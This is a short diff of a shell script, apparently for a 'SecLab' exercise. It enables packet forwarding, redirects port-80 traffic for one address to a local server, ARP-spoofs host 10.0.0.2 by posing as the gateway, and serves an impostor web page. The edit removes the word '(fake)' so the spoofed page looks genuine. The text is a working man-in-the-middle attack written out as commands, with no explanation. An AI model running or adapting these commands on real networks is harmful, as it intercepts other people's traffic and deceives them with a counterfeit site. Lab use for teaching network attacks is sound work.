@@ -10,6 +10,6 @@ iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
 
 iptables -t nat -A PREROUTING -p tcp -i eth0 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080
 
-echo 'Welcome to (fake) SecLab' > index.html
+echo -n "Welcome to SecLab" > index.html
 
 arpspoof -i eth0 -t 10.0.0.2 10.0.0.1 & python -m SimpleHTTPServer 8080 && fg
